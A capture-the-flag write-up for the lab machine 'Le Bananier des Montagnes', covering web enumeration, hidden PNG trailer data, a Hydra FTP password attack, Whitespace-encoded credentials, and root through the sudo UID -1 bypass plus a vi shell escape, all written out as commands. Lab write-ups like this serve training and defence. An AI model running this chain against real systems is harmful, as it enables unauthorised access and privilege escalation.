---
type: writeup
platform: Exegol
room: Le Bananier des Montagnes
os: Linux
environment: Web / Linux Privilege Escalation

techniques:
  - web-enumeration
  - data-decoding
  - png-trailer-analysis
  - password-attack
  - ftp-enumeration
  - whitespace-decoding
  - credential-discovery
  - ssh-access
  - lateral-movement
  - sudo-abuse
  - sudo-user-id-bypass
  - vi-shell-escape

tools:
  - nmap
  - curl
  - exiftool
  - python3
  - hydra
  - ftp
  - ssh
  - sudo
  - vi
---
**Attack path:** Web enumeration → PNG trailer data → targeted FTP password attack → Whitespace credentials → SSH as `valerian` → exposed `gabriel` credential → vulnerable sudo rule/version → `vi` shell escape → root

## 1. Reconnaissance

Initial service enumeration was performed with:

```bash
nmap -sC -sV -Pn <TARGET_IP>
```

A full TCP scan was also used to confirm the exposed services:

```bash
nmap -p- --min-rate 5000 -Pn <TARGET_IP>
```

Relevant results:

```bash
21/tcp  FTP   vsftpd 3.0.5
22/tcp  SSH   OpenSSH 10.0p2
80/tcp  HTTP  Apache 2.4.68
```

Anonymous FTP authentication was tested first but rejected.

With no immediate FTP access, attention moved to the HTTP service.

---

## 2. Web Enumeration

The web server displayed the default Apache page.

Inspection of the page source revealed an unusual JavaScript message:

```javascript
confirm("Have you checked everything yet? Maybe the video?")
```

The page also referenced:

```bash
/assets/style.css
```

Directory listing was enabled under `/assets/` and exposed:

```bash
MusaTroglodytarum.mp4
style.css
```

The stylesheet contained a more useful clue:

```css
/* Nice to see someone checking the stylesheets.
   Take a look at the page: /l3_B4n4N13r_D3s_M0nT4gN3s.php
*/
```

This provided a concrete hidden endpoint rather than requiring blind directory discovery.

---

## 3. Hidden Page and Directory

The disclosed PHP page was requested:

```bash
curl -i \
  http://<TARGET_IP>/l3_B4n4N13r_D3s_M0nT4gN3s.php
```

The response redirected to another hidden path:

```bash
/L3s_Fru1ts_s0nt_c0NNus_Gen3raL3m3nt_s0Us_l3_N0m_D3_B4N4n3
```

That directory exposed:

```bash
Hot_Babe.png
```

The image was downloaded for analysis.

---

## 4. PNG Trailer Data

Metadata inspection was performed with:

```bash
exiftool Hot_Babe.png
```

ExifTool reported:

```bash
Warning : Trailer data after PNG IEND chunk
```

A PNG normally ends at its `IEND` chunk, so this indicated that additional bytes had been appended after the legitimate image data.

The preserved notes record that this trailer was extracted with Python, but the exact historical extraction command was not retained.

The extracted data began with:

```bash
Eh, you've earned this. Username for FTP is banane_celeste
One of these is the password:
```

followed by approximately 200 password candidates.

This revealed a valid-looking FTP username:

```bash
banane_celeste
```

and provided a small, targeted password set.

---

## 5. Targeted FTP Password Attack

The candidate passwords were converted into a clean wordlist:

```bash
tail -n +4 trailer.bin \
  | sed '/^[[:space:]]*$/d' \
  > ftp_passwords.txt
```

Hydra was used against FTP:

```bash
hydra \
  -l banane_celeste \
  -P ftp_passwords.txt \
  -t 1 \
  -W 1 \
  -f \
  ftp://<TARGET_IP>
```

A single thread was used because the FTP service rejected excessive simultaneous connections.

A valid credential was recovered:

```bash
Username: banane_celeste
Password: <REDACTED>
```

This converted the information recovered from the image into authenticated FTP access.

---

## 6. FTP Enumeration

The FTP service was accessed:

```bash
ftp <TARGET_IP>
```

The account contained:

```bash
Valerian's_Creds.txt
```

The file was downloaded:

```bash
get "Valerian's_Creds.txt"
```

At first, its contents appeared to consist mostly of blank space and ordinary French text.

Displaying otherwise invisible characters changed that interpretation:

```bash
cat -A "Valerian's_Creds.txt"
```

The file contained large sequences of spaces, tabs and line feeds.

This suggested that the whitespace itself carried encoded information.

---

## 7. Whitespace Credential Recovery

Whitespace is an esoteric language whose instructions are represented entirely through:

```text
spaces
tabs
line feeds
```

The preserved notes record that the hidden Whitespace program was decoded successfully, but the exact historical decoding command or tool was not retained.

The resulting credentials were:

```bash
Username: valerian
Password: <REDACTED>
```

SSH was already exposed on port `22`, providing the natural validation target.

---

## 8. SSH as `valerian`

The recovered credentials were tested:

```bash
ssh valerian@<TARGET_IP>
```

Authentication succeeded.

After login, the system displayed a message:

```bash
Hi, just a reminder that in case of need,
check our """s3cr3t""" hiding place.
```

A search identified:

```bash
/usr/games/s3cr3t
```

The directory contained a hidden file:

```bash
/usr/games/s3cr3t/.msg_fr0m_v4l3r14n
```

Its contents referenced:

```bash
gab
```

and disclosed a password.

Public version:

```bash
Password: <REDACTED>
```

At this point, `gab` was only a clue to another identity. Local user enumeration was needed before using the credential.

---

## 9. `valerian` → `gabriel`

Normal local accounts were enumerated with:

```bash
awk -F: '$3 >= 1000 && $1 != "nobody" {print $1, $3, $6, $7}' /etc/passwd
```

Relevant users included:

```bash
gabriel
valerian
banane_celeste
```

The `gab` reference therefore corresponded to:

```bash
gabriel
```

The disclosed password was tested locally:

```bash
su - gabriel
```

Authentication succeeded.

The new user context provided access to:

```bash
/home/gabriel/user.txt
```

The user flag was read:

```bash
cat ~/user.txt
```

```bash
EPI{REDACTED}
```

The compromise had now progressed from remote web enumeration to the local account `gabriel`.

---

## 10. Privilege Enumeration as `gabriel`

Current privileges were inspected:

```bash
whoami
id
sudo -l
```

Relevant output:

```bash
gabriel
uid=1000(gabriel) gid=1000(gabriel) groups=1000(gabriel)

User gabriel may run the following commands on le_bananier_des_montagnes:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gabriel/user.txt
```

The rule allowed `gabriel` to execute:

```bash
/usr/bin/vi /home/gabriel/user.txt
```

as any user **except `root`**, without a password.

This did not appear to provide direct root execution.

However, the home directory also contained:

```bash
note.txt
```

with the message:

```bash
I haven't find a way to update that specific package...
Oh well, old is retro right? And retro is hype, right?
```

The note suggested that an outdated installed package was relevant to the escalation.

Because the unusual sudo rule was already a strong candidate, the sudo version was checked next.

---

## 11. Outdated Sudo Version

The installed version was obtained with:

```bash
sudo --version | head -n 1
```

Result:

```bash
Sudo version 1.8.27
```

The preserved notes identify this release as vulnerable to a user-ID handling bypass affecting the following type of sudo rule:

```bash
(ALL, !root)
```

The rule intended to permit every target user except root.

The vulnerable behavior involved supplying the special numeric user ID:

```bash
-1
```

through sudo's `-u` option.

---

## 12. Bypassing the `!root` Restriction

The permitted `vi` command was invoked with:

```bash
sudo -u#-1 /usr/bin/vi /home/gabriel/user.txt
```

Despite the sudoers exclusion:

```bash
!root
```

the vulnerable sudo implementation accepted the special UID and launched the allowed command with root privileges.

At this point, privileged execution still occurred inside `vi`.

The next step was therefore to use functionality already available inside the permitted editor.

---

## 13. `vi` Shell Escape → Root

`vi` can invoke external shell commands.

From inside the privileged editor, the following command was executed:

```vim
:!/bin/bash -p
```

The resulting shell was verified with:

```bash
id
whoami
```

Result:

```bash
uid=0(root) gid=1000(gabriel) groups=1000(gabriel)
root
```

This confirmed successful privilege escalation to root.

The exploit depended on both conditions:

```text
sudoers permits vi as every user except root
        +
vulnerable sudo version mishandles UID -1
        =
vi executes with UID 0
        ↓
vi shell escape
        ↓
root shell
```

---

## 14. Root Flag

The final flag was retrieved with:

```bash
cat /root/root.txt
```

```bash
EPI{REDACTED}
```

---

## Key Takeaways

- Web enumeration should include linked assets such as CSS and media directories; the critical hidden endpoint was disclosed in a stylesheet rather than the visible page.
- A warning about data after a PNG `IEND` chunk is evidence of appended content and should be investigated separately from normal image metadata.
- Small challenge-specific password candidate sets are better suited to targeted testing than unnecessarily large generic wordlists.
- Files that appear blank may still encode information through non-printing characters; inspecting whitespace exposed the next credential.
- Credential discovery and credential validity are separate stages: each recovered password was tested against the identity and service suggested by the surrounding evidence.
- A sudoers rule that excludes root should not automatically be considered safe when the installed sudo implementation itself is vulnerable.
- Version information becomes security-relevant when the surrounding configuration matches the conditions required by a known implementation flaw.
- Allowing a privileged editor such as `vi` through sudo is particularly dangerous because the editor can execute external commands and provide a shell.